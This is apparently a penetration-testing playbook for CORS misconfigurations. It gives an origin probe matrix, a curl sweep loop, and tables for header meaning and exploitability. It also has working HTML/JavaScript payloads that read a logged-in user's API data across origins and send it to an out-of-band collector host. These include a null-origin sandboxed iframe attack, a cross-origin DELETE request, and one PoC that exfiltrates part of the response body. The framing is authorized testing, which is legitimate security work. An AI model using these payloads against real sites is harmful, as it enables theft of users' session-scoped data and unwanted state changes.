# CORS origin-reflection test matrix (step 2)
# Send each as the Origin header; record ACAO + ACAC in origin_tests.jsonl:
# {endpoint, origin_sent, acao, acac, reflected, exploitable}.

| Origin sent | Detects |
|---|---|
| `https://evil.example` | arbitrary-origin reflection (the big one) |
| `null` | `null` accepted (reachable via sandboxed iframe / data: URL) |
| `https://TARGET.evil.example` | prefix/subdomain-suffix regex gap |
| `https://evil-TARGET` / `https://TARGETevil.example` | naive `startsWith`/`includes(TARGET)` |
| `https://TARGET.com.evil.example` | post-domain gap (suffix match on `TARGET.com`) |
| `https://sub.TARGET.com` | trusted-subdomain wildcard (then find an XSS/takeover on a sub) |
| `http://TARGET.com` | scheme downgrade accepted |
| `https://TARGET.com.` | trailing-dot / parser quirk |

## Exploitability rule (what makes it real — see verify.md)
- `ACAO: <reflected attacker origin>` **and** `ACAC: true` **and** endpoint returns sensitive,
  credentialed data → exploitable (cross-origin credentialed read).
- `ACAO: *` **with** `ACAC: true` → browsers block; NOT exploitable as a credentialed read.
- `ACAO: *` **without** creds, but endpoint leaks sensitive data to anyone → finding (data exposure).

## Read PoC
```html
<script>
fetch('https://TARGET/api/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('//OOB/?'+encodeURIComponent(d.slice(0,100))));
</script>
```
Exfil only a benign marker/length in a real engagement unless retention is authorized.

---

## Extended arsenal — CORS (misconfiguration testing + credentialed reads)
# Placeholders: TARGET = victim app/HOST, ATTACKER = attacker origin (evil.example), OOB / TOKEN.oob.example =
# collector. Proof is ALWAYS a cross-origin read of a TEST account's own sensitive data (benign marker), never
# a real victim's data. Record each probe in origin_tests.jsonl. Scope + approval required.

### Expanded origin probe matrix (send as the `Origin` request header)
| Origin sent | Misconfig it detects |
|---|---|
| `https://evil.example` | arbitrary-origin reflection (the big one) |
| `null` | `null` accepted → reachable from a sandboxed iframe / `data:`/`about:blank` (PoC below) |
| `https://sub.TARGET.com` | trusted-subdomain wildcard → chain a subdomain XSS / takeover |
| `https://TARGET.com.evil.example` | suffix match on `TARGET.com` (post-domain gap) |
| `https://eviltarget.com` / `https://TARGET.com.evil.example` | naive `includes("TARGET.com")` substring |
| `https://evil-TARGET.com` | naive `startsWith`/prefix match |
| `http://TARGET.com` | scheme downgrade accepted (http origin trusted) |
| `https://TARGET.com:1337` | port ignored in the allow-list match |
| `https://TARGET.com.` | trailing-dot FQDN parser quirk |
| `https://TARGET%60.evil.example` (backtick) | backtick/control char splits the host in a weak regex |
| `https://TARGETxevil.example` (underscore/`_`, `-`) | unanchored regex `.` or special-char gap |
| `https://not-TARGET.com` | regex missing `^`/`$` anchors |
| `https://TARGET.attacker.example` | `endsWith`/suffix on the wrong label |
```bash
# Fast sweep — record ACAO + ACAC for every origin; flag reflections.
for O in https://evil.example null https://sub.TARGET.com https://TARGET.com.evil.example \
         http://TARGET.com https://TARGET.com. https://eviltarget.com; do
  echo "=== $O"
  curl -s -o /dev/null -D - -H "Origin: $O" --cookie "session=TESTCOOKIE" \
       https://TARGET/api/me | grep -i '^access-control-'
done
```

### `Access-Control-*` response-header reference (what each line means for exploitability)
| Response header | Meaning / impact |
|---|---|
| `Access-Control-Allow-Origin` (ACAO) | which origin may read the response. Reflected attacker value = the finding |
| `Access-Control-Allow-Credentials: true` (ACAC) | cookies/HTTP-auth included AND the response is readable → **credentialed read** |
| `Access-Control-Allow-Methods` | verbs the server permits cross-origin (matters for a non-simple request preflight) |
| `Access-Control-Allow-Headers: *` or named | which request headers are allowed; `*` is broad (but `*` does NOT cover `Authorization`) |
| `Access-Control-Expose-Headers` | response headers JS can read cross-origin — can leak tokens/IDs in headers |
| `Access-Control-Max-Age` | how long the preflight result is cached (seconds) |
| `Vary: Origin` | required when ACAO is dynamic; its ABSENCE enables cache poisoning of ACAO across users |

### Exploitability truth table (combine ACAO × ACAC × data)
| ACAO | ACAC | Verdict |
|---|---|---|
| reflected attacker origin | `true` | **exploitable** — credentialed cross-origin read of sensitive data |
| `*` | `true` | browser **rejects** (spec forbids `*`+creds) → not a credentialed read |
| `*` | absent | sensitive data readable by ANY origin without creds → data-exposure finding |
| reflected attacker origin | absent | readable cross-origin but **no cookies** → only matters if the endpoint is sensitive unauthenticated, or you can supply the victim's token another way |
| fixed single allow-listed origin | `true` | not exploitable unless you control that origin (subdomain XSS/takeover) |

### Preflight mechanics (so you know when the browser will or won't ask first)
```
# NO preflight (simple request) when ALL hold:
#   method in {GET, HEAD, POST}
#   request headers only in the CORS-safelist (Accept, Accept-Language, Content-Language, Content-Type, Range*)
#   Content-Type in {application/x-www-form-urlencoded, multipart/form-data, text/plain}
# Otherwise the browser sends OPTIONS first (preflight). The real credentialed request only fires if the
# preflight returns matching ACAO (NOT *), ACAC:true, Allow-Methods, Allow-Headers. A server that preflights
# correctly for PUT/DELETE but STILL reflects Origin+creds is exploitable for those verbs too.
# Authorization header: NEVER covered by Allow-Headers:* — must be named explicitly to be sent cross-origin.
```

### Cross-origin credentialed READ PoC (fetch)
```html
<script>
fetch('https://TARGET/api/me', {credentials:'include'})            // cookies ride along
  .then(r=>r.text())
  .then(d=>{
     // benign: exfil only a length/marker (or a single non-sensitive field) in a live engagement
     navigator.sendBeacon('https://TOKEN.oob.example/', 'len='+d.length);
  });
</script>
```

### Same read via XHR (older stacks / when you need response headers)
```html
<script>
var x=new XMLHttpRequest();
x.open('GET','https://TARGET/api/me',true);
x.withCredentials=true;
x.onload=function(){
  // Access-Control-Expose-Headers leaks? read a header cross-origin:
  var h=x.getResponseHeader('X-Account-Id');
  fetch('https://TOKEN.oob.example/?hdr='+(h?'present':'none')+'&len='+x.responseText.length);
};
x.send();
</script>
```

### `null`-origin exploitation (ACAO: null accepted)
```html
<!-- A sandboxed iframe (no allow-same-origin) sends Origin: null. Host this as the attacker page. -->
<iframe style="display:none" sandbox="allow-scripts"
  srcdoc="&lt;script&gt;
    fetch('https://TARGET/api/me',{credentials:'include'})
      .then(r=&gt;r.text())
      .then(d=&gt;fetch('https://TOKEN.oob.example/?len='+d.length));
  &lt;/script&gt;"></iframe>
```

### Trusted-subdomain / allow-listed-origin chaining
```
# ACAO reflects ONLY *.TARGET.com (not arbitrary origins) → not directly exploitable. Escalate by getting
# JS execution on ANY subdomain that the allow-list trusts:
#   - XSS on a subdomain → run the credentialed fetch from there
#   - subdomain takeover (dangling CNAME) → host the PoC on a now-attacker-controlled *.TARGET.com
#   - an http:// subdomain + MITM position (note only; usually out of scope)
# Then the read runs from an origin the server already trusts. Cross-ref: subdomain-takeover, xss skills.
```

### Non-simple verbs (PUT/DELETE/PATCH cross-origin writes)
```html
<script>
// Only fires if the preflight PASSES (ACAO reflected + ACAC:true + Allow-Methods includes DELETE).
// This is a CORS-enabled STATE CHANGE — overlaps csrf; attribute to whichever the server actually allows.
fetch('https://TARGET/api/users/TESTID', {method:'DELETE', credentials:'include'})
  .then(r=>fetch('https://TOKEN.oob.example/?status='+r.status));
</script>
```

### ACAO cache poisoning (missing `Vary: Origin`)
```
# If ACAO is reflected dynamically but the response is cacheable and lacks `Vary: Origin`, a shared cache can
# store the attacker-origin ACAO and serve it to other users. Overlaps cache-poisoning skill — confirm a
# cross-user cache hit there; here just flag the missing Vary + reflected ACAO.
```

### Internal / SSRF-reachable CORS
```
# An internal admin/API that reflects Origin+creds becomes readable from any page a victim-with-access visits.
# If only reachable server-side, that's an SSRF chain, not CORS — route to the ssrf skills.
```

### Pitfalls / false-positive guards (so verify.md passes)
```
# - ACAO: * on a PUBLIC, unauthenticated, non-sensitive API (fonts, public catalog) = by design, NOT a finding.
# - Reflected ACAO with ACAC ABSENT over data that needs no auth = low/no impact unless the data is sensitive.
# - `*`+creds is browser-blocked → do not report it as a credentialed read.
# - Confirm the endpoint actually returns SENSITIVE, SESSION-SCOPED data (prove with two TEST identities:
#   each reads its OWN data cross-origin). A reflected origin over empty/public JSON is not exploitable.
# - Authorization-bearer APIs (no cookies): CORS read needs the token too — note how the attacker would obtain
#   it (usually they can't) before rating severity.
```

### origin_tests.jsonl scoring
```
# {endpoint, origin_sent, acao, acac, reflected, data_sensitivity, verdict}
#   verdict: "exploitable" (reflected+acac+sensitive) | "exposure" (*+sensitive, no creds) |
#            "chain" (subdomain/null only) | "safe"
```
